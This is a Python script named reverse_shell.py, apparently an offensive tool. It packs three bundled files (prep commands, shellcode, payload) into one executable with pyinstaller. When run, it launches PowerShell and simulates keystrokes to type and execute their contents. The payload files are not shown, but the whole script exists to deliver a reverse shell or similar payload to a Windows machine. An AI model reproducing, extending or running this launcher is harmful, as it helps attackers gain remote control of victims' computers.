from subprocess import Popen
from pyautogui import write, press
from time import sleep
import os
import sys

# pyinstaller --onefile --add-data "cmds.txt;." --add-data "shellcode.txt;." --add-data "payload.txt;." reverse_shell.py

# consts
run = lambda string: Popen(string, shell=True) # subprocess create
enter = lambda: press('enter') # enter() key press
sec = 1.5 # delay

def resource_path(relative_path):
    """Get absolute path to resource, works for pyinstaller."""
    try:
        # for pyinstaller
        base_path = sys._MEIPASS
    except AttributeError:
        # running as a script
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


# file reading func
def read(file):
    with open(resource_path(file), 'r') as f:
        return f.read()


# read payloads
prep_cmds = read('cmds.txt')
shellcode = read('shellcode.txt')
payload = read('payload.txt')

# run commands
run('start powershell.exe'); sleep(2.5)
write(prep_cmds); sleep(sec); enter()
write(shellcode); sleep(sec); enter()

# run commands
for line in payload.split('\n'):
    write(line); sleep(0.1); enter()
